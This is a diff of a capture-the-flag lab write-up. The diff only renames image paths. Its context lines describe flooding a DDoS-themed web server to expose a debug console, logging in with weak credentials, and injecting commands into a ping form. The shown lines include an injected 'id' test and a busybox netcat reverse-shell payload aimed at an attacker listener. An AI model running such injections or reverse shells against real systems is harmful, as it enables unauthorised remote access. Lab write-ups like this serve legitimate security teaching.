@@ -68,7 +68,7 @@ Two ports were open: **SSH on port 22** (OpenSSH 8.4p1, Debian 11) and **HTTP on
 
 Browsing to `http://192.168.100.140/` revealed a flashy, taunting landing page themed around DDoS resilience — openly daring attackers to try flooding the service.
 
-![](machines/umz/image.png)
+![](images/img.png)
 
 The page included slogans such as *"your ddos means nothing"*, *"warning: we want your ddos attacks"*, and a live counter claiming *"∞ blocked"*. The HTML source code contained two telling comments:
 
@@ -115,7 +115,7 @@ stress                  [Status: 200, Size: 2707, Words: 909, Lines: 94, Duratio
 
 The hidden GET parameter **`stress`** was discovered. Accessing `http://192.168.100.140/index.php?stress=test` revealed the **Resource Stress Test Interface** — a diagnostic page that boasted "DDoS Protection Active" and performed CPU-intensive operations such as prime number generation (1,229 primes up to 10,000). The health check identifier `HEALTHY_STRING` was displayed alongside the system status.
 
-![](image-1.png)
+![](images/img-1.png)
 
 ### Crashing Port 80 (The Intended DDoS)
 
@@ -123,7 +123,7 @@ The machine's entire theme was a misdirection wrapped in a hint: the `stress` pa
 
 After sustained flooding, port 80 became completely unreachable:
 
-![](image-2.png)
+![](images/img-2.png)
 
 The browser returned `ERR_CONNECTION_REFUSED` — `192.168.100.140` refused to connect on port 80.
 
@@ -159,7 +159,7 @@ Port **8080** was now open, running **Werkzeug httpd 1.0.1 (Python 3.9.2)** — 
 
 Browsing to `http://192.168.100.140:8080/login` revealed a clean "System Debug Console" login form.
 
-![](image-3.png)
+![](images/img-3.png)
 
 Given the beginner difficulty, common weak credential pairs were tested. The valid credentials were found to be:
 
@@ -170,11 +170,11 @@ Given the beginner difficulty, common weak credential pairs were tested. The val
 
 Successful authentication redirected to `/admin`, which presented a **System Maintenance Panel** — a simple web form accepting an IP address and executing a `ping` command.
 
-![](image-4.png)
+![](images/img-4.png)
 
 Since the application appeared to pass user input directly to a shell command, a semicolon (`;`) was used to inject an additional command. Injecting `192.168.100.1 ; id` confirmed command injection:
 
-![](image-5.png)
+![](images/img-5.png)
 
 The output clearly showed:
 
@@ -200,7 +200,7 @@ The following payload was injected into the ping form to spawn a reverse shell:
 192.168.100.1 ; busybox nc 192.168.100.1 4444 -e /bin/bash
 ```
 
-![](image-6.png)
+![](images/img-6.png)
 
 The application's output confirmed the command was executed (it timed out waiting for ping since the shell was handed off). The listener caught the connection:
 
